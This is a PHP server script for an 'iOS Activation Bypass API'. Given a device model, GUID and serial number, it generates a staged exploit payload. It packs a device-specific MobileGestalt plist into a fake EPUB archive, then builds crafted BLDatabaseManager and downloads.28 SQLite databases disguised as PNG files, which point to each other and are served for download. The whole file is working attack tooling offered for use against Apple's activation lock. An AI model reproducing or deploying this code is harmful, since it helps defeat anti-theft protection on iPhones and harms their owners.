<?php
/**
 * iOS Activation Bypass Backend
 * Enhanced Professional Edition with A12_Bypass_OSS improvements
 * Version: 2.0.0
 */

error_reporting(E_ALL);
ini_set('display_errors', 0); 
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../logs/error.log');

define('BASE_DIR', __DIR__ . '/..');
define('TEMPLATE_DIR', BASE_DIR . '/templates');
define('ASSETS_DIR', BASE_DIR . '/assets');
define('CACHE_DIR', __DIR__ . '/cache');

$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$scriptPath = dirname($_SERVER['PHP_SELF'] ?? '/');
if ($scriptPath === '/' || $scriptPath === '\\') $scriptPath = '';
define('BASE_URL', rtrim($protocol . "://" . $host . $scriptPath, '/'));

if (!is_dir(CACHE_DIR)) mkdir(CACHE_DIR, 0755, true);
if (!is_dir(CACHE_DIR . '/stage1')) mkdir(CACHE_DIR . '/stage1', 0755, true);
if (!is_dir(CACHE_DIR . '/stage2')) mkdir(CACHE_DIR . '/stage2', 0755, true);
if (!is_dir(CACHE_DIR . '/stage3')) mkdir(CACHE_DIR . '/stage3', 0755, true);

function log_debug($msg, $level = 'INFO') {
    $timestamp = date('Y-m-d H:i:s');
    error_log("[$timestamp] [$level] $msg");
}

class PayloadGenerator {
    private $prd;
    private $guid;
    private $sn;

    public function __construct($prd, $guid, $sn) {
        $this->prd = str_replace(',', '-', $prd);
        $this->guid = strtoupper(trim($guid));
        $this->sn = $sn;
    }

    private function generateToken() { 
        return bin2hex(random_bytes(8)); 
    }

    private function readTemplate($filename) {
        if (!file_exists($filename)) {
            throw new Exception("Template missing: " . basename($filename));
        }
        return file_get_contents($filename);
    }

    private function createDatabaseFromSql($sqlContent, $outputPath) {
        try {
            $sqlContent = preg_replace_callback(
                "/unistr\s*\(\s*['\"]([^'\"]*)['\"]\\s*\)/i",
                function($matches) {
                    $str = $matches[1];
                    $str = preg_replace_callback(
                        '/\\\\([0-9A-Fa-f]{4})/',
                        function($m) {
                            return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UCS-2BE');
                        },
                        $str
                    );
                    return "'" . str_replace("'", "''", $str) . "'";
                },
                $sqlContent
            );
            
            $sqlContent = preg_replace("/unistr\s*\(\s*(['\"][^'\"]*['\"])\s*\)/i", "$1", $sqlContent);

            $db = new SQLite3($outputPath);
            $db->exec('PRAGMA journal_mode = WAL');
            
            $statements = explode(';', $sqlContent);
            foreach ($statements as $stmt) {
                $stmt = trim($stmt);
                if (!empty($stmt) && strlen($stmt) > 5) {
                    @$db->exec($stmt . ';');
                }
            }
            $db->close();
            return true;
        } catch (Exception $e) {
            log_debug("DB Creation Error: " . $e->getMessage(), "ERROR");
            return false;
        }
    }

    public function process() {
        log_debug("=== STARTING PAYLOAD GENERATION ===");
        log_debug("Device: {$this->prd}, GUID: {$this->guid}, SN: {$this->sn}");
        
        $plistSource = ASSETS_DIR . "/Maker/{$this->prd}/com.apple.MobileGestalt.plist";
        
        if (!file_exists($plistSource)) {
            $altPath = __DIR__ . "/Maker/{$this->prd}/com.apple.MobileGestalt.plist";
            if (file_exists($altPath)) {
                $plistSource = $altPath;
            } else {
                log_debug("Plist not found for device: {$this->prd}", "ERROR");
                http_response_code(404);
                throw new Exception("Configuration not found for device {$this->prd}");
            }
        }
        
        log_debug("Using plist: $plistSource (size: " . filesize($plistSource) . " bytes)");

        $token1 = $this->generateToken();
        $dir1 = CACHE_DIR . "/stage1/$token1";
        mkdir($dir1, 0755, true);
        
        $cachesDir = "$dir1/Caches";
        mkdir($cachesDir, 0755, true);
        
        $tmpMimetype = "$cachesDir/mimetype";
        file_put_contents($tmpMimetype, "application/epub+zip");
        
        $zipPath = "$dir1/temp.zip";
        $zip = new ZipArchive();
        
        if ($zip->open($zipPath, ZipArchive::CREATE) !== TRUE) {
            log_debug("Failed to create ZIP archive", "ERROR");
            throw new Exception("Compression Error");
        }
        
        if (!$zip->addFile($tmpMimetype, "Caches/mimetype")) {
            log_debug("Failed to add mimetype to ZIP", "ERROR");
            throw new Exception("Failed to add mimetype to archive");
        }
        $zip->setCompressionName("Caches/mimetype", ZipArchive::CM_STORE);
        
        if (!$zip->addFile($plistSource, "Caches/com.apple.MobileGestalt.plist")) {
            log_debug("Failed to add plist to ZIP", "ERROR");
            throw new Exception("Failed to add plist to archive");
        }
        
        $zip->close();
        
        unlink($tmpMimetype);
        rmdir($cachesDir);
        
        rename($zipPath, "$dir1/fixedfile");
        log_debug("Stage 1 complete: fixedfile created (EPUB-compliant)");
        
        $fixedFileUrl = BASE_URL . "/cache/stage1/$token1/fixedfile";

        $token2 = $this->generateToken();
        $dir2 = CACHE_DIR . "/stage2/$token2";
        mkdir($dir2, 0755, true);

        $blTemplateFile = __DIR__ . '/BLDatabaseManager.png';
        if (file_exists($blTemplateFile)) {
            $blSql = file_get_contents($blTemplateFile);
            log_debug("Using BLDatabaseManager.png template");
        } else {
            $blSql = $this->readTemplate(TEMPLATE_DIR . '/bl_structure.sql');
            log_debug("Using bl_structure.sql template");
        }
        
        $blSql = str_replace('KEYOOOOOO', $fixedFileUrl, $blSql);
        
        $this->createDatabaseFromSql($blSql, "$dir2/intermediate.sqlite");
        rename("$dir2/intermediate.sqlite", "$dir2/belliloveu.png");
        log_debug("Stage 2 complete: BLDatabase created");
        
        $blUrl = BASE_URL . "/cache/stage2/$token2/belliloveu.png";

        $token3 = $this->generateToken();
        $dir3 = CACHE_DIR . "/stage3/$token3";
        mkdir($dir3, 0755, true);

        $dlBinaryFile = __DIR__ . '/downloads.28.sqlitedb';
        $dlPngFile = __DIR__ . '/downloads.28.png';
        
        if (file_exists($dlBinaryFile)) {
            copy($dlBinaryFile, "$dir3/payload.png");
            log_debug("Using binary downloads.28.sqlitedb template (" . filesize($dlBinaryFile) . " bytes)");
            
            try {
                $db = new SQLite3("$dir3/payload.png");
                $db->exec("UPDATE asset SET url = REPLACE(url, 'https://google.com', '$blUrl') WHERE url LIKE '%google.com%'");
                $db->exec("UPDATE asset SET url = REPLACE(url, 'https://your_domain_here', '" . BASE_URL . "') WHERE url LIKE '%your_domain_here%'");
                $db->exec("UPDATE asset SET destination_url = REPLACE(destination_url, 'GOODKEY', '{$this->guid}') WHERE destination_url LIKE '%GOODKEY%'");
                $db->close();
                log_debug("Updated SQLite binary with URLs and GUID");
            } catch (Exception $e) {
                log_debug("Warning: Could not update binary DB URLs: " . $e->getMessage(), "WARN");
            }
        } elseif (file_exists($dlPngFile)) {
            $fileHeader = file_get_contents($dlPngFile, false, null, 0, 16);
            if (strpos($fileHeader, 'SQLite') !== false) {
                copy($dlPngFile, "$dir3/payload.png");
                log_debug("Using binary downloads.28.png as SQLite (" . filesize($dlPngFile) . " bytes)");
                
                try {
                    $db = new SQLite3("$dir3/payload.png");
                    $db->exec("UPDATE asset SET url = REPLACE(url, 'https://google.com', '$blUrl') WHERE url LIKE '%google.com%'");
                    $db->exec("UPDATE asset SET url = REPLACE(url, 'https://your_domain_here', '" . BASE_URL . "') WHERE url LIKE '%your_domain_here%'");
                    $db->exec("UPDATE asset SET destination_url = REPLACE(destination_url, 'GOODKEY', '{$this->guid}') WHERE destination_url LIKE '%GOODKEY%'");
                    $db->close();
                    log_debug("Updated SQLite binary with URLs and GUID");
                } catch (Exception $e) {
                    log_debug("Warning: Could not update binary DB URLs: " . $e->getMessage(), "WARN");
                }
            } else {
                $dlSql = file_get_contents($dlPngFile);
                log_debug("Using downloads.28.png as SQL text template");
                $dlSql = str_replace('https://google.com', $blUrl, $dlSql);
                $dlSql = str_replace('GOODKEY', $this->guid, $dlSql);
                $this->createDatabaseFromSql($dlSql, "$dir3/payload.png");
            }
        } else {
            $dlSql = $this->readTemplate(TEMPLATE_DIR . '/downloads_structure.sql');
            log_debug("Using downloads_structure.sql template");
            $dlSql = str_replace('https://google.com', $blUrl, $dlSql);
            $dlSql = str_replace('GOODKEY', $this->guid, $dlSql);
            $this->createDatabaseFromSql($dlSql, "$dir3/payload.png");
        }
        
        touch("$dir3/payload.png-wal");
        touch("$dir3/payload.png-shm");
        log_debug("Stage 3 complete: Final payload with WAL/SHM files (" . filesize("$dir3/payload.png") . " bytes)");
        
        $finalUrl = BASE_URL . "/cache/stage3/$token3/payload.png";
        log_debug("=== PAYLOAD GENERATION COMPLETE ===");
        log_debug("Final URL: $finalUrl");
        
        return $finalUrl;
    }
}

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
$path = trim($path, '/');

if (isset($_GET['prd'], $_GET['guid'], $_GET['sn'])) {
    try {
        $prd = trim($_GET['prd']);
        $guid = trim($_GET['guid']);
        $sn = trim($_GET['sn']);
        
        log_debug("Request received: prd=$prd, guid=$guid, sn=$sn");
        
        if (empty($prd) || empty($guid) || empty($sn)) {
            http_response_code(400);
            header('Content-Type: application/json');
            echo json_encode(["success" => false, "error" => "Parameters cannot be empty"]);
            exit;
        }
        
        $gen = new PayloadGenerator($prd, $guid, $sn);
        $url = $gen->process();
        
        header('Content-Type: application/json');
        $response = [
            "success" => true,
            "status" => "success",
            "downloadUrl" => $url,
            "parameters" => [
                "prd" => $prd,
                "guid" => $guid,
                "sn" => $sn
            ],
            "timestamp" => date('Y-m-d\TH:i:sP')
        ];
        echo json_encode($response, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);
        exit;
    } catch (Exception $e) {
        log_debug("Payload generation failed: " . $e->getMessage(), "ERROR");
        http_response_code(500);
        header('Content-Type: application/json');
        echo json_encode([
            "success" => false,
            "error" => "Payload generation failed",
            "message" => $e->getMessage()
        ]);
        exit;
    }
}

if ($path === 'health' || $path === '' || $path === 'index.php') {
    header('Content-Type: application/json');
    header('Cache-Control: no-cache, no-store, must-revalidate');
    
    $deviceCount = 0;
    $makerDir = ASSETS_DIR . '/Maker';
    if (is_dir($makerDir)) {
        $deviceCount = count(array_filter(scandir($makerDir), function($d) use ($makerDir) {
            return $d !== '.' && $d !== '..' && is_dir($makerDir . '/' . $d);
        }));
    }
    
    echo json_encode([
        "status" => "healthy",
        "timestamp" => date('Y-m-d\TH:i:sP'),
        "server" => "iOS Activation Bypass API",
        "version" => "2.0.0",
        "supported_devices" => $deviceCount,
        "endpoints" => [
            "GET /" => "Health check",
            "GET /?prd=DEVICE&guid=GUID&sn=SERIAL" => "Generate payload",
            "GET /get2.php?prd=DEVICE&guid=GUID&sn=SERIAL" => "Alternative endpoint"
        ]
    ], JSON_PRETTY_PRINT);
    exit;
}

if ($path === 'devices' || $path === 'list') {
    header('Content-Type: application/json');
    $devices = [];
    $makerDir = ASSETS_DIR . '/Maker';
    if (is_dir($makerDir)) {
        $devices = array_values(array_filter(scandir($makerDir), function($d) use ($makerDir) {
            return $d !== '.' && $d !== '..' && is_dir($makerDir . '/' . $d);
        }));
    }
    echo json_encode([
        "success" => true,
        "count" => count($devices),
        "devices" => $devices
    ], JSON_PRETTY_PRINT);
    exit;
}

http_response_code(400);
header('Content-Type: application/json');
echo json_encode([
    "success" => false,
    "error" => "Missing parameters: prd, guid, sn",
    "usage" => "GET /?prd=iPhone12-1&guid=XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&sn=XXXXX"
]);
